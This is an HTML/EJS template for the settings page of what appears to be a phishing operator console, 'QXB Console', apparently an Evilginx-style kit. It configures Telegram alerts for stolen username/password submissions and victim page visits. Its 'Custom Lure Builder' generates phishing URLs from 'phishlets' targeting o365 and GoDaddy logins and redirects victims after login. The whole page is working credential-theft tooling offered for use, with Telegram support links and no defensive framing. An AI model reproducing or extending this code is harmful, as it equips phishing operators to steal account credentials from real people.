<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - QXB Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/css/cyber.css">
    
    <style>
        .settings-container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 20px;
            width: 100%;
        }

        .settings-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo-img {
            width: 48px;
            height: 48px;
            filter: drop-shadow(0 0 10px var(--accent-cyan-glow));
        }

        .header-title {
            font-size: 1.75rem;
            background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--accent-purple) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header-subtitle {
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin-top: 2px;
        }

        .settings-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 32px;
        }

        .settings-card {
            padding: 32px;
        }

        .card-header-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .card-heading {
            font-size: 1.25rem;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .card-subtitle {
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin-top: 4px;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin-bottom: 24px;
        }

        @media (max-width: 768px) {
            .form-row {
                grid-template-columns: 1fr;
            }
        }

        .setup-box {
            background: var(--bg-input);
            border: 1px dashed var(--border-glow);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
        }

        .setup-title {
            font-size: 0.95rem;
            color: var(--accent-cyan);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .setup-list {
            list-style: decimal;
            padding-left: 20px;
            font-size: 0.85rem;
            color: var(--text-secondary);
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .toggle-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }

        .toggle-row:last-child {
            border-bottom: none;
        }

        .toggle-info h4 {
            font-size: 0.95rem;
            font-weight: 600;
            color: var(--text-primary);
        }

        .toggle-info p {
            font-size: 0.8rem;
            color: var(--text-secondary);
            margin-top: 2px;
        }

        .form-hint {
            font-size: 0.8rem;
            color: var(--text-muted);
            margin-top: 6px;
        }

        .button-group {
            display: flex;
            gap: 16px;
            margin-top: 16px;
        }

        /* Footer styling */
        .settings-footer {
            margin-top: 48px;
            padding-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 0.8rem;
        }

        .settings-footer a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.2s;
        }

        .settings-footer a:hover {
            color: var(--accent-cyan);
        }
    </style>
</head>

<body>
    <div class="settings-container">
        <!-- Header -->
        <header class="settings-header">
            <div class="header-left">
                <img src="https://fuchsia-quickest-kite-522.mypinata.cloud/ipfs/bafkreifxytn5dxnfaj2thdcpj3n7ltoufvhipekdpvijspsc6lg66m5e3m" alt="QXB" class="logo-img">
                <div>
                    <h1 class="header-title glow-text">Settings</h1>
                    <p class="header-subtitle">Configure notifications, lures, and console security</p>
                </div>
            </div>
            <div>
                <a href="/" class="btn btn-outline">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="19" y1="12" x2="5" y2="12"></line>
                        <polyline points="12 19 5 12 12 5"></polyline>
                    </svg>
                    Dashboard
                </a>
            </div>
        </header>

        <!-- Toast Container for Balloons -->
        <div class="toast-container">
            <% if (messages && messages.success) { %>
                <div class="toast success" id="successToast">
                    <span style="font-size: 1.25rem;">✨</span>
                    <div><%= messages.success %></div>
                </div>
            <% } %>
            <% if (messages && messages.error) { %>
                <div class="toast error" id="errorToast">
                    <span style="font-size: 1.25rem;">⚠️</span>
                    <div><%= messages.error %></div>
                </div>
            <% } %>
        </div>

        <div class="settings-grid">
            <!-- Telegram Bot Config -->
            <div class="settings-card glass-panel">
                <div class="card-header-bar">
                    <div>
                        <h2 class="card-heading"><span style="color: var(--accent-cyan);">🤖</span> Telegram Notifications</h2>
                        <p class="card-subtitle">Receive live logs and credential notifications on Telegram</p>
                    </div>
                    <% if (settings.telegram_token && settings.telegram_chatid) { %>
                        <span class="badge badge-success">Connected</span>
                    <% } %>
                </div>

                <div class="setup-box">
                    <h4 class="setup-title">Setup Walkthrough</h4>
                    <ol class="setup-list">
                        <li>Locate <strong>@BotFather</strong> on Telegram and send <strong>/newbot</strong></li>
                        <li>Copy the generated <strong>HTTP API Token</strong> and enter it below</li>
                        <li>Find your personal ID by messaging <strong>@userinfobot</strong> on Telegram</li>
                        <li>For channel/group alerts, add your bot as an admin and use the chat ID</li>
                    </ol>
                </div>

                <form action="/settings/telegram" method="POST">
                    <div class="form-row">
                        <div>
                            <label class="form-label">Telegram Bot Token</label>
                            <input type="text" class="form-input" name="telegram_token" value="<%= settings.telegram_token %>" placeholder="Bot token from @BotFather">
                            <p class="form-hint">Do not share this token with unauthorized third-parties</p>
                        </div>
                        <div>
                            <label class="form-label">Telegram Chat ID</label>
                            <input type="text" class="form-input" name="telegram_chatid" value="<%= settings.telegram_chatid %>" placeholder="Personal user ID or group ID">
                            <p class="form-hint">E.g., 7995526950 or channel chat ID prefix</p>
                        </div>
                    </div>

                    <div style="margin-bottom: 24px;">
                        <div class="toggle-row">
                            <div class="toggle-info">
                                <h4>Global Notifications</h4>
                                <p>Toggle all Telegram alert mechanisms</p>
                            </div>
                            <label class="switch">
                                <input type="checkbox" name="notify_all" <%=(settings.notify_login || settings.notify_visit) ? 'checked' : '' %>>
                                <span class="slider"></span>
                            </label>
                        </div>

                        <div class="toggle-row">
                            <div class="toggle-info">
                                <h4>Credentials Submissions</h4>
                                <p>Notify when credentials (username/password) are submitted</p>
                            </div>
                            <label class="switch">
                                <input type="checkbox" name="notify_login" <%=settings.notify_login ? 'checked' : '' %>>
                                <span class="slider"></span>
                            </label>
                        </div>

                        <div class="toggle-row">
                            <div class="toggle-info">
                                <h4>Page Visitors Log</h4>
                                <p>Notify when page visitors land on target pages (very verbose)</p>
                            </div>
                            <label class="switch">
                                <input type="checkbox" name="notify_visit" <%=settings.notify_visit ? 'checked' : '' %>>
                                <span class="slider"></span>
                            </label>
                        </div>
                    </div>

                    <div class="button-group">
                        <button type="submit" class="btn btn-cyan">Save Configuration</button>
                        <button type="button" class="btn btn-outline" onclick="sendTestMessage()">Send Test Message</button>
                    </div>
                </form>
            </div>

            <!-- Lure Generator Section -->
            <div class="settings-card glass-panel">
                <div class="card-header-bar">
                    <div>
                        <h2 class="card-heading"><span style="color: var(--accent-purple);">🔗</span> Custom Lure Builder</h2>
                        <p class="card-subtitle">Generate custom URLs for target projects</p>
                    </div>
                </div>

                <div class="form-row">
                    <div>
                        <label class="form-label">Custom Hostname (Optional)</label>
                        <input type="text" class="form-input" id="lureHost" name="host" placeholder="Uses defaults if left blank">
                        <p class="form-hint">Leave blank to use hostname auto-resolution</p>
                    </div>
                    <div>
                        <label class="form-label">URI Path</label>
                        <input type="text" class="form-input" id="lurePath" name="path" placeholder="E.g., /update-account">
                        <p class="form-hint">Must start with a forward slash</p>
                    </div>
                </div>

                <div class="form-row">
                    <div>
                        <label class="form-label">Select Project</label>
                        <select class="form-input" id="lurePhishlet" name="phishlet" style="background: var(--bg-input); border-color: var(--border-glow);">
                            <% if (typeof phishlets !== 'undefined' && phishlets.length > 0) { %>
                                <% phishlets.forEach(p => { %>
                                    <option value="<%= p %>"><%= p %></option>
                                  <% }); %>
                            <% } else { %>
                                <option value="o365">o365</option>
                                <option value="goDaddy">goDaddy</option>
                            <% } %>
                        </select>
                        <p class="form-hint">Target templates</p>
                    </div>
                    <div>
                        <label class="form-label">Redirect Target (Optional)</label>
                        <input type="text" class="form-input" id="lureRedirect" name="redirect" placeholder="E.g., https://office.com">
                        <p class="form-hint">Redirect victim after successful login</p>
                    </div>
                </div>

                <div class="button-group" style="margin-bottom: 24px;">
                    <button type="button" class="btn btn-cyan" onclick="submitLure()">Create & Apply Lure</button>
                    <button type="button" class="btn btn-outline" onclick="generateLure()">Generate URL Preview</button>
                </div>

                <div id="lureResult" style="display: none; background: var(--bg-input); border: 1px solid var(--border-glow); padding: 16px; border-radius: 12px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                        <span style="font-size: 0.85rem; font-weight: 600; color: var(--accent-purple);">Preview URL</span>
                        <button class="btn btn-outline" style="padding: 6px 12px; font-size: 0.75rem;" onclick="copyLureResult()">Copy Preview</button>
                    </div>
                    <div id="lureOutput" style="font-family: monospace; font-size: 0.85rem; color: var(--accent-cyan); word-break: break-all;"></div>
                </div>
            </div>

            <!-- Password Changer Section -->
            <div class="settings-card glass-panel">
                <div class="card-header-bar">
                    <div>
                        <h2 class="card-heading"><span style="color: var(--accent-danger);">🔒</span> Dashboard Authentication</h2>
                        <p class="card-subtitle">Change security password for this console session</p>
                    </div>
                </div>

                <form action="/settings/password" method="POST">
                    <div style="max-width: 500px; margin-bottom: 24px;">
                        <label class="form-label">New Password</label>
                        <input type="password" class="form-input" name="new_password" placeholder="Enter new dashboard password" required>
                    </div>
                    <button type="submit" class="btn btn-danger">Update Console Password</button>
                </form>
            </div>
        </div>

        <footer class="settings-footer">
            <a href="https://t.me/qxbtrenches" target="_blank">Telegram Channel</a>
            <a href="https://t.me/fuckmonad" target="_blank">Support Desk</a>
            <a href="https://t.me/fuckmonad" target="_blank">Feedback</a>
        </footer>
    </div>

    <script>
        const domainMap = <%- JSON.stringify(typeof domainMap !== 'undefined' ? domainMap : {}) %>;
        const globalServer = "<%= typeof globalServer !== 'undefined' ? globalServer : '' %>";
        const phishletSubdomains = <%- JSON.stringify(typeof phishletSubdomains !== 'undefined' ? phishletSubdomains : {}) %>;

        document.getElementById('lurePhishlet').addEventListener('change', function (e) {
            const selected = e.target.value;
            const mappedDomain = domainMap[selected] || globalServer || window.location.host;
            document.getElementById('lureHost').placeholder = "e.g. " + mappedDomain;
        });

        window.addEventListener('DOMContentLoaded', () => {
            const el = document.getElementById('lurePhishlet');
            if (el && el.value) {
                const mappedDomain = domainMap[el.value] || globalServer || window.location.host;
                document.getElementById('lureHost').placeholder = "e.g. " + mappedDomain;
            }

            // Toast Auto-Dismiss
            const successToast = document.getElementById('successToast');
            const errorToast = document.getElementById('errorToast');

            if (successToast) {
                setTimeout(() => successToast.classList.add('show'), 100);
                setTimeout(() => {
                    successToast.classList.remove('show');
                    setTimeout(() => successToast.remove(), 400);
                }, 5000);
            }
            if (errorToast) {
                setTimeout(() => errorToast.classList.add('show'), 100);
                setTimeout(() => {
                    errorToast.classList.remove('show');
                    setTimeout(() => errorToast.remove(), 400);
                }, 5000);
            }
        });

        function submitLure() {
            const host = document.getElementById('lureHost').value.trim();
            let path = document.getElementById('lurePath').value.trim();
            const phishlet = document.getElementById('lurePhishlet').value;
            const redirect = document.getElementById('lureRedirect').value.trim();

            if (!path || !phishlet) {
                alert('Path and Project are required fields.');
                return;
            }

            if (!path.startsWith('/')) {
                path = '/' + path;
            }

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/create-lure';

            const inputs = [
                { name: 'host', value: host },
                { name: 'path', value: path },
                { name: 'phishlet', value: phishlet },
                { name: 'redirect', value: redirect }
            ];

            inputs.forEach(i => {
                const hiddenField = document.createElement('input');
                hiddenField.type = 'hidden';
                hiddenField.name = i.name;
                hiddenField.value = i.value;
                form.appendChild(hiddenField);
            });

            document.body.appendChild(form);
            form.submit();
        }

        function generateLure() {
            const selectedPhishlet = document.getElementById('lurePhishlet').value;
            const customHost = document.getElementById('lureHost').value.trim();
            
            let host = '';
            if (customHost !== '') {
                host = customHost;
            } else {
                const sub = phishletSubdomains[selectedPhishlet] || '';
                const fallbackHost = domainMap[selectedPhishlet] || globalServer || window.location.host;
                host = sub ? `${sub}.${fallbackHost}` : fallbackHost;
            }

            let path = document.getElementById('lurePath').value.trim();
            const redirect = document.getElementById('lureRedirect').value.trim();

            if (!path) path = '/test-path';
            if (!path.startsWith('/')) path = '/' + path;

            let url = `https://${host}${path}`;
            if (redirect) {
                const encoded = btoa(redirect).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
                url += `?r=${encoded}`;
            }

            document.getElementById('lureOutput').textContent = url;
            document.getElementById('lureResult').style.display = 'block';
        }

        function sendTestMessage() {
            fetch('/test-telegram', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        alert('Test message sent successfully!');
                    } else {
                        alert('Error: ' + data.error);
                    }
                })
                .catch(err => alert('Test message request failed: ' + err));
        }

        function copyLureResult() {
            const text = document.getElementById('lureOutput').textContent;
            if (text) {
                copyString(text);
                alert("URL copied to clipboard!");
            }
        }

        function copyString(text) {
            const copyToClipboard = (str) => {
                if (navigator.clipboard && window.isSecureContext) {
                    return navigator.clipboard.writeText(str);
                } else {
                    let textArea = document.createElement("textarea");
                    textArea.value = str;
                    textArea.style.position = "fixed";
                    textArea.style.left = "-999999px";
                    textArea.style.top = "-999999px";
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    try {
                        document.execCommand('copy');
                        textArea.remove();
                        return Promise.resolve();
                    } catch (err) {
                        textArea.remove();
                        return Promise.reject(err);
                    }
                }
            };

            copyToClipboard(text).catch(err => {
                console.error('Failed to copy: ', err);
                alert("Could not copy automatically. Please select and copy manually.");
            });
        }
    </script>
</body>

</html>